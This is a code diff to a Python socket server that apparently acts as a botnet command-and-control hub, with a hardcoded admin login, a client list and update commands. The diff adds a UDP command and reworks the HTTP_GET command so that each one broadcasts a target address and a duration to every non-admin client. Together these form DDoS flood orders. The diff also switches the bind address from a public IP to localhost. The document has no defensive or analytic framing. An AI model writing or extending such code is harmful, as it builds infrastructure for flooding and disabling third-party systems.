@@ -7,6 +7,7 @@ ALOGIN_CMD = "ALOGIN : cxpzeRGSPJEd"
 LIST_CMD = "LIST"
 ALIST_CMD = "ALIST"
 HTTP_GET_CMD = "HTTP_GET"
+UDP_CMD = "UDP"
 UPDATE_CMD = "UPDATE"
 GET_UPDATER_CMD = "GET_UPDATER"
 UPDATE_CONFIRM_CMD = "UPDATE_CONFIRM"
@@ -81,18 +82,22 @@ class Server:
                             client.sendall(str(data).encode())
                     elif HTTP_GET_CMD in message:
                         print("PIZDA?")
-                        url = message.split(':')[1]
+                        print(message)
+                        url = message.split(':')[1]+":"+message.split(':')[2]
+                        sec = message.split(':')[3]
+                        print(url)
                         for c in self.clients:
                             if not (c in self.admins):
-                                c.sendall(f"{HTTP_GET_CMD}:{url}")
-                                try:
-                                    response = c.recv(1024).decode()
-                                    if(response == "SUCCESS"):
-                                        client.sendall("Request sent successfully!".encode())
-                                    else:
-                                        client.sendall("Request failed!".encode())
-                                except socket.timeout:
-                                    client.sendall("Request failed!".encode())
+                                c.sendall(f"{HTTP_GET_CMD}:{url}:{sec}".encode())
+                    elif UDP_CMD in message:
+                        print("PIZDA?")
+                        print(message)
+                        url = message.split(':')[1]
+                        sec = message.split(':')[2]
+                        print(url)
+                        for c in self.clients:
+                            if not (c in self.admins):
+                                c.sendall(f"{UDP_CMD}:{url}:{sec}".encode())
                     else:
                         print(f"Received message: {message}")
                         # Send message to all clients if sender is an admin
@@ -120,5 +125,5 @@ class Server:
             client.close()
 
 if __name__ == "__main__":
-    server = Server("212.109.199.128", 4202)
+    server = Server("127.0.0.1", 4202)
     server.start()
